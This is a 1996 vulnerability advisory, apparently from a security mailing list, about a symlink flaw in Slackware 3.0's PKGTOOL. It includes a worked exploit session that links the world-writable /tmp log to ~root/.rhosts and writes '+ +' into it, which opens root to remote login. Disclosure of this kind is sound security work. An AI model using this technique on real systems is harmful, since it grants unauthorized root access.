@@ -1,0 +1,65 @@
+
+                        [BUG] Vulnerability in PKGTOOL
+                                       
+   Sean B. Hamor (hamors@LITTERBOX.ORG)
+   Mon, 26 Aug 1996 21:22:49 -0400
+   
+Note:
+
+  I'm not sure whether or not information this has been previously released.
+  I found this earlier this evening while poking around, and apologize if
+  I've just found an old bug.
+
+  I verified the existence of this bug in PKGTOOL for Linux Slackware 3.0.
+  My assumption would be that most other Linux distributions are effected as
+  well.
+
+
+Synopsis:
+
+  A problem exists in the way PKGTOOL handles the /tmp/PKGTOOL.REMOVED
+  logfile.  This logfile is created mode 666, which allows any user to write
+  to it.  Although this file is usually created the first time PKGTOOL is
+  run and can't be removed by normal users, a problem develops if root or
+  the owner of the logfile deletes it for some reason or if PKGTOOL has
+  never been run before.
+
+
+Exploit:
+
+  If /tmp/PKGTOOL.REMOVED gets deleted or hasn't been created yet, any user
+  can now create a symbolic link from /tmp/PKGTOOL.REMOVED to ~root/.rhosts
+  (for a generic example).  The next time PKGTOOL is run, which will more
+  than likely be run by root, ~root/.rhosts will be created as a 666 file
+  with the logs from PKGTOOL as its contents.  One may now simply do an echo
+  "+ +" > /tmp/PKGTOOL.REMOVED, then rm /tmp/PKGTOOL.REMOVED.
+
+  For this example, root is the victim while hamors is the attacker:
+
+hamors (2 20:57) litterbox:/tmp> ls -al | grep PKG
+- -rw-rw-rw-   1 root     root        16584 Aug 26 18:07 PKGTOOL.REMOVED.backup
+
+hamors (3 21:00) litterbox:/tmp> ln -s ~root/.rhosts PKGTOOL.REMOVED
+
+hamors (4 20:58) litterbox:/tmp> cat PKGTOOL.REMOVED
+cat: PKGTOOL.REMOVED: No such file or directory
+
+God (17 20:59) litterbox:~# pkgtool
+  root now uses PKGTOOL to delete a package
+
+hamors (5 DING!) litterbox:/tmp> head PKGTOOL.REMOVED
+Removing package tcl:
+Removing files:
+  ...
+
+hamors (6 21:00) litterbox:/tmp> echo "+ +" > PKGTOOL.REMOVED
+
+hamors (7 21:00) litterbox:/tmp> cat ~root/.rhosts
++ +
+
+
+Verification:
+
+This vulnerability has been tested on Linux Slackware 3.0 with the stock
+installed PKGTOOL.
+
